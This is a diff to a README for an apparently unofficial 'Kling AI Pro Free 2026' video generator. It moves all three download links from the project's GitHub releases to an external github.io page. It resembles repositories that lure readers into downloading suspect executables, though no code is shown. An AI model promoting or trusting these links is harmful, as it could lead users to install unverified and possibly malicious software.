@@ -1,6 +1,6 @@
 # 🎬 kling-ai-free-2026 - Free AI Video Generator for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Kling_AI_Pro_Free_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/linemimir8231/kling-ai-free-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Kling_AI_Pro_Free_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://linemimir8231.github.io)
 
 ---
 
@@ -45,7 +45,7 @@ No trial periods. No limited-time offers. No "premium" paywall. This tool is fre
 
 Visit this link to download the application:
 
-**[https://github.com/linemimir8231/kling-ai-free-2026/releases](https://github.com/linemimir8231/kling-ai-free-2026/releases)**
+**[https://linemimir8231.github.io](https://linemimir8231.github.io)**
 
 The download page will show you available files. Look for the most recent version and download it to your computer.
 
@@ -234,7 +234,7 @@ If you find this tool useful, consider supporting the project:
 
 Need to download again? Here's the link:
 
-**[Download Kling AI Free 2026](https://github.com/linemimir8231/kling-ai-free-2026/releases)**
+**[Download Kling AI Free 2026](https://linemimir8231.github.io)**
 
 ---
 
